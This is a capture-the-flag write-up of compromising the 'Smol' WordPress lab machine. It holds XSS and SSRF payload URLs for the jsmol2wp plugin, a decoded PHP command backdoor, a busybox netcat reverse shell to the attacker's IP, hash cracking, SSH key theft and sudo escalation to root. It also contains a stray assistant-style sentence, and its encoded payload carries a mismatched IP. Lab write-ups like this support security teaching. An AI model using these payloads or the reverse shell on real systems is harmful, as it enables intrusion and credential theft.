Smol.thm - A Detailed Penetration Test Write-up

This document provides a detailed walkthrough of how the Smol.thm machine was compromised, from initial reconnaissance to gaining full root control. It outlines the methodology and techniques used during the penetration test and is intended for educational purposes.
# Table of Contents

I will incorporate the provided content into the structured outline, ensuring proper Markdown formatting for display on GitHub, including correct headings and functional anchor links.
Markdown

# Table of Contents

- [1. Reconnaissance and Initial Enumeration](#1-reconnaissance-and-initial-enumeration)
- [2. WordPress Vulnerabilities and Initial Access](#2-wordpress-vulnerabilities-and-initial-access)
  - [XSS Vulnerability (Example Payload)](#xss-vulnerability-example-payload)
  - [SSRF Vulnerability (Target Payload)](#ssrf-vulnerability-target-payload)
- [3. Gaining a Reverse Shell](#3-gaining-a-reverse-shell)
- [4. Privilege Escalation to Diego](#4-privilege-escalation-to-diego)
- [5. Privilege Escalation to think](#5-privilege-escalation-to-think)
- [6. Privilege Escalation to xavi](#6-privilege-escalation-to-xavi)
- [7. Privilege Escalation to root](#7-privilege-escalation-to-root)
- [8. Conclusion](#8-conclusion)


# 1-reconnaissance-and-initial-enumeration

The initial phase involved gathering information about the target machine, 10.10.231.99.
Nmap Scan

An Nmap scan was performed to identify open ports and services running on the target.

nmap -sC -sV 10.10.231.99

Nmap Output - Initial Findings:

Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-03 05:02 UTC
Nmap scan report for 10.10.231.99
Host is up (0.093s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://www.smol.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.97 seconds

The scan revealed two open ports:

    Port 22 (SSH): Running OpenSSH 8.2p1 on Ubuntu.

    Port 80 (HTTP): Running Apache httpd 2.4.41 on Ubuntu. The HTTP service on port 80 redirected to http://www.smol.thm.

/etc/hosts Modification

To properly resolve the domain www.smol.thm to the target's IP address, an entry was added to the /etc/hosts file on the attacking machine.

subl /etc/hosts
    Add the following line:
    10.10.231.99    www.smol.thm

Gobuster Directory Enumeration

With the hostname configured, gobuster was used to enumerate directories and files on the web server using a common wordlist.

gobuster dir -u http://www.smol.thm/ -w /usr/share/wordlists/dirb/common.txt

Gobuster Output - WordPress Identification:

    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://www.smol.thm/
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /.htaccess            (Status: 403) [Size: 277]
    /.hta                 (Status: 403) [Size: 277]
    /.htpasswd            (Status: 403) [Size: 277]
    /index.php            (Status: 301) [Size: 0] [--> http://www.smol.thm/]
    /server-status        (Status: 403) [Size: 277]
    /wp-admin             (Status: 301) [Size: 315] [--> http://www.smol.thm/wp-admin/]
    /wp-content           (Status: 301) [Size: 317] [--> http://www.smol.thm/wp-content/]
    /wp-includes          (Status: 301) [Size: 318] [--> http://www.smol.thm/wp-includes/]
    /xmlrpc.php           (Status: 405) [Size: 42]
    Progress: 4614 / 4615 (99.98%)
    ===============================================================
    Finished
    ===============================================================

The Gobuster scan indicated the presence of several WordPress-related directories (/wp-admin, /wp-content, /wp-includes), confirming that the website was running WordPress.
WPScan Vulnerability Scan

To specifically identify vulnerabilities within the WordPress installation, wpscan was utilized with a provided API token.

wpscan --url http://www.smol.thm --api-token REDACTED

WPScan was instrumental in identifying potential vulnerabilities, leading to the discovery of the exploitable jsmol2wp plugin.

# 2-wordpress-vulnerabilities-and-initial-access

Further investigation focused on the WordPress installation, leveraging insights from wpscan to identify and exploit vulnerabilities.
jsmol2wp Plugin Vulnerabilities

Guided by wpscan's output and subsequent manual inspection, the jsmol2wp plugin was confirmed to be installed and vulnerable to both Cross-Site Scripting (XSS) and Server-Side Request Forgery (SSRF).

# XSS Vulnerability (Example Payload):

http://localhost:8080/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=%3Cscript%3Ealert(/xss/)%3C/script%3E&mimetype=text/html;%20charset=utf-8

# SSRF Vulnerability (Target Payload):

http://localhost:8080/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php

Exploiting SSRF to Obtain Database Credentials

The SSRF vulnerability was leveraged to read the contents of the wp-config.php file, which typically contains the WordPress database credentials.

http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php

This request successfully returned the wp-config.php content, revealing the following database user and password:

    Username: wpuser

    Password: kbLSF2Vop#lw3rjDZ629*Z%G

WordPress Administrator Login

Using the obtained credentials, a login to the WordPress administration panel at www.smol.thm/wp-login.php was attempted and successful.
Discovering and Decoding the Backdoor

While exploring the WordPress admin area, a file named hello.php was identified. The SSRF vulnerability was reused to read its content:

http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php

The file contained a base64 encoded string:

CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=

Decoding this string revealed a simple PHP backdoor:

if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }

Which, after resolving the octal and hexadecimal escape sequences, translates to:

if (isset($_GET["cmd"])) { system($_GET["cmd"]); }

This backdoor allows for arbitrary command execution on the server by passing commands via the cmd GET parameter.

# 3-gaining-a-reverse-shell

With the command execution vulnerability confirmed, the next objective was to establish a persistent and interactive reverse shell on the target system.
Crafting and Executing the Reverse Shell Payload

A busybox nc reverse shell payload was constructed. To ensure proper execution through the URL, the payload was base64 encoded.

Reverse Shell Payload (Encoded for URL):

echo "busybox nc 10.6.48.108 4445 -e sh" | base64 <- Change your attckers IP
Output: YnVzeWJveCBuYyAxMC42LjQ4LjEwOCA0NDQ1IC1lIHNo

The encoded payload was then executed via the cmd parameter in the URL:

http://www.smol.thm/wp-admin/index.php?cmd=echo YnVzeWJveCBuYyAxMC42LjQ0LjEwOCA0NDQ1IC1lIHNo | base64 -d | bash

Setting up the Netcat Listener

Prior to executing the payload, a Netcat listener was set up on the attacking machine (10.6.48.108) on port 4445 to receive the incoming connection.

nc -lvnp 4445

Upon executing the URL, the Netcat listener successfully caught the shell:

listening on [any] 4445 ...
connect to [10.6.48.108] from (UNKNOWN) [10.10.109.27] 38294

This provided a limited shell as the www-data user.
Spawning a Better Shell

To gain a fully interactive shell, a Python PTY was spawned from the existing shell:

python3 -c 'import pty; pty.spawn("/bin/bash")'

This established a fully functional shell, ready for further enumeration and privilege escalation.

# 4-privilege-escalation-to-diego

The next phase involved escalating privileges from the www-data user to a higher-privileged account.
MySQL Database Access

The wpuser credentials obtained from wp-config.php were used to access the MySQL database.

mysql -u wpuser -p
Enter password: kbLSF2Vop#lw3rjDZ629*Z%G

Dumping wp_users Table

Inside the MySQL prompt, the wordpress database was selected, and the wp_users table was queried to extract user hashes.

show databases;
use wordpress;
select * from wp_users;

The query returned the following user information and their password hashes:

+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
| ID | user_login | user_pass                          | user_nicename | user_email         | user_url            | user_registered     | user_activation_key | user_status | display_name           |
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
|  1 | admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. | admin         | admin@smol.thm     | http://www.smol.thm | 2023-08-16 06:58:30 |                     |           0 | admin                  |
|  2 | wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. | wp            | wp@smol.thm        | http://smol.thm     | 2023-08-16 11:04:07 |                     |           0 | wordpress user         |
|  3 |       | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ |          | josemlwdf@smol.thm | http://smol.thm     | 2023-08-16 15:01:02 |                     |           0 | Jose Mario Llado Marti |
|  4 | gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 | gege          | gege@smol.thm      | http://smol.thm     | 2023-08-17 20:18:50 |                     |           0 | gege                   |
|  5 | diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 | diego         | diego@local        | http://smol.thm     | 2023-08-17 20:19:15 |                     |           0 | diego                  |
|  6 | xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 | xavi          | xavi@smol.thm      | http://smol.thm     | 2023-08-17 20:20:01 |                     |           0 | xavi                   |
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+

# Cracking diego's Password

The hash for the user diego ($P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1) was extracted and saved to a file. John the Ripper was then used with the phpass format and the rockyou.txt wordlist to crack the password.

Save diego's hash to a file, e.g., diego_hash.txt
john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt diego_hash.txt

The cracked password for diego was found to be sandiegocalifornia.
Switching User to diego and Finding user.txt

With diego's password, it was possible to switch user from www-data to diego.

su diego
Password: sandiegocalifornia

After successfully switching, the user.txt flag was located in diego's home directory.

cat user.txt

User Flag: 45edaec653ff9ee06236b7ce72b86963
# 5. Privilege Escalation to think

Further enumeration was performed to identify a path to higher privileges.
Locating think's SSH Private Key

While exploring diego's environment, it was discovered that the user think had an SSH private key (id_rsa) stored in their .ssh directory.

cd /home/think/.ssh/
cat id_rsa

The contents of id_rsa were copied.
Using the SSH Key to Login as think

The copied id_rsa content was saved to a file on the attacking machine (e.g., think_id_rsa). The permissions of the private key file were then set correctly to 600.

chmod 600 think_id_rsa

Finally, SSH was used to log in as think using the private key.

ssh -i think_id_rsa think@10.10.109.27

This granted a shell as the user think.
# 6. Privilege Escalation to xavi

The next step involved finding credentials for another user to continue the privilege escalation chain.
Discovering and Cracking wordpress.old.zip

During enumeration, a file named wordpress.old.zip was found in gege's home directory. This file was likely a backup of the old WordPress installation. To retrieve it, a Python HTTP server was started on the target.

On the target machine (as think, assuming appropriate file access):

python3 -m http.server 9000

Then, on the attacking machine, the file was downloaded:

wget http://10.10.109.27:9000/wordpress.old.zip

The wordpress.old.zip file was password-protected. zip2john was used to extract the hash, and then John the Ripper with the rockyou.txt wordlist was used to crack the password.

zip2john wordpress.old.zip > zip_hash.txt
john zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

The password for the zip file was found to be hero_gege@hotmail.com.
Extracting xavi's Credentials

After unzipping the archive using the cracked password, the wp-config.php file within the extracted WordPress directory was examined. This revealed credentials for the xavi user:

    Username: xavi

    Password: P@ssw0rdxavi@

Switching User to xavi

With xavi's credentials, it was possible to switch user from think to xavi.

su xavi
Password: P@ssw0rdxavi@

# 7. Privilege Escalation to root

This was the final stage of the penetration test, aiming to achieve full root control of the machine.
Checking xavi's Sudo Privileges

Once logged in as xavi, the sudo -l command was executed to check xavi's sudo privileges.

sudo -l

The output indicated that xavi had full sudo privileges, allowing them to run any command as any user (including root) without requiring a password.

Matching Defaults entries for xavi on smol:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on smol:
    (ALL : ALL) ALL

This is a significant misconfiguration, providing a direct path to root.
Gaining Root Access and Finding root.txt

With full sudo privileges, xavi could easily become root.

sudo su

Finally, the root.txt flag was located in the /root directory.

cd /root
cat root.txt

Root Flag: bf89ea3ea01992353aef1f576214d4e4
# 8. Conclusion

The Smol.thm machine was successfully exploited by chaining multiple vulnerabilities and privilege escalation techniques. The process involved:

    Initial reconnaissance with Nmap and Gobuster to identify WordPress.

    WPScan was instrumental in identifying potential vulnerabilities, helping to pinpoint the vulnerable jsmol2wp plugin.

    Exploiting an SSRF vulnerability in that plugin to gain database credentials and uncover a hidden PHP backdoor.

    Leveraging the PHP backdoor for initial command execution and establishing a stable reverse shell.

    Cracking WordPress user hashes to gain access as diego.

    Discovering and utilizing an SSH private key to pivot to the think user.

    Cracking a password-protected zip archive to obtain credentials for xavi.

    Exploiting xavi's misconfigured sudo privileges to achieve root access.

This machine presented a comprehensive learning experience in a typical web application penetration test scenario.
